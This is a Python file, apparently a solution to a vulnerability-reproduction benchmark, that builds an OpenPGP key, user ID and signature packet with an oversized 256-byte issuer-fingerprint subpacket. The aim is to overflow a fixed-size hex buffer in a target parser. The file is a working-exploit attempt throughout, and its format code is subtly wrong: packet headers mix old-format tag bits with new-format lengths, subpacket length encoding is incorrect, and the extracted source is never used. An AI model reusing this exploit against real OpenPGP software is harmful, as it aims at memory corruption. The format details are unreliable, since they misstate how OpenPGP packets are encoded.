import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source to analyze vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for openpgp-related code to understand structure
            # We'll generate a minimal PoC based on common fingerprint overflow patterns
            
            # Common fingerprint formats in OpenPGP:
            # - V4: 20 bytes (SHA-1) typically represented as 40 hex chars
            # - V5: 32 bytes (SHA-256) as 64 hex chars
            # Buffer overflow often occurs when writing hex representation
            
            # Strategy: Create a key with fingerprint data that triggers overflow
            # when converted to hex string without proper bounds checking
            
            # Build a minimal OpenPGP packet sequence:
            # 1. Public Key Packet (tag 6)
            # 2. User ID Packet (tag 13)  
            # 3. Signature Packet (tag 2) with fingerprint subpacket
            
            poc = bytearray()
            
            # Public Key Packet (tag 6, V4 RSA)
            # Use minimal 512-bit key for small size
            pubkey_data = bytearray()
            pubkey_data.append(4)  # Version 4
            pubkey_data.extend(b'\x00\x00\x00\x00')  # Creation time (epoch)
            pubkey_data.append(1)  # RSA algorithm
            
            # Minimal RSA public key (n=512 bits, e=65537)
            # n = 2^511 + 1 (minimal valid modulus)
            n_bits = 512
            n_bytes = (n_bits + 7) // 8
            n = (1 << (n_bits - 1)) + 1  # 2^511 + 1
            n_mpi = struct.pack('>H', n_bits) + n.to_bytes(n_bytes, 'big')
            
            e = 65537
            e_bits = 17
            e_bytes = (e_bits + 7) // 8
            e_mpi = struct.pack('>H', e_bits) + e.to_bytes(e_bytes, 'big')
            
            pubkey_data.extend(n_mpi)
            pubkey_data.extend(e_mpi)
            
            # Encode as packet
            poc.extend(self._create_packet(6, pubkey_data))
            
            # User ID Packet (tag 13) - minimal
            user_id = b'test@example.com'
            poc.extend(self._create_packet(13, user_id))
            
            # Signature Packet (tag 2) V4
            sig_data = bytearray()
            sig_data.append(4)  # Version 4
            sig_data.append(0)  # Signature type (generic certification)
            sig_data.append(1)  # PK algorithm (RSA)
            sig_data.append(8)  # Hash algorithm (SHA256)
            
            # Hashed subpacket area
            hashed_subpackets = bytearray()
            
            # Create fingerprint subpacket that triggers overflow
            # Subpacket type 33 = issuer fingerprint (V4)
            # We'll create a fingerprint that's longer than expected
            # when converted to hex string
            
            # Standard fingerprint is 20 bytes -> 40 hex chars
            # Create one that's much longer to overflow fixed buffer
            fingerprint = b'\x00' * 256  # 256 bytes fingerprint (should be only 20)
            
            fp_subpacket = bytearray()
            fp_subpacket.append(33)  # Issuer fingerprint subpacket type
            fp_subpacket.extend(struct.pack('>H', len(fingerprint) + 1))
            fp_subpacket.append(4)  # Key version 4
            fp_subpacket.extend(fingerprint)
            
            hashed_subpackets.extend(fp_subpacket)
            
            # Add creation time subpacket (required)
            creation_subpacket = b'\x02\x04\x00\x00\x00\x00'  # 4-byte time=0
            hashed_subpackets.extend(creation_subpacket)
            
            # Encode hashed subpacket length
            sig_data.extend(struct.pack('>H', len(hashed_subpackets)))
            sig_data.extend(hashed_subpackets)
            
            # Unhashed subpacket area (empty)
            sig_data.extend(b'\x00\x00')
            
            # Hash prefix
            sig_data.extend(b'\x00' * 2)
            
            # MPI signature values (minimal)
            sig_mpi = struct.pack('>H', 512) + b'\x00' * 64  # 512-bit signature
            sig_data.extend(sig_mpi)
            
            poc.extend(self._create_packet(2, sig_data))
            
            return bytes(poc)
    
    def _create_packet(self, tag: int, data: bytes) -> bytes:
        """Create OpenPGP packet with appropriate header"""
        packet = bytearray()
        
        # New format packet
        if len(data) < 192:
            # One-byte length
            packet.append(0x80 | (tag << 2) | 0x00)
            packet.append(len(data))
        elif len(data) < 8384:
            # Two-byte length
            packet.append(0x80 | (tag << 2) | 0x01)
            length = len(data) - 192
            packet.append((length >> 8) + 192)
            packet.append(length & 0xFF)
        else:
            # Five-byte length
            packet.append(0x80 | (tag << 2) | 0x02)
            packet.extend(struct.pack('>I', len(data)))
        
        packet.extend(data)
        return bytes(packet)
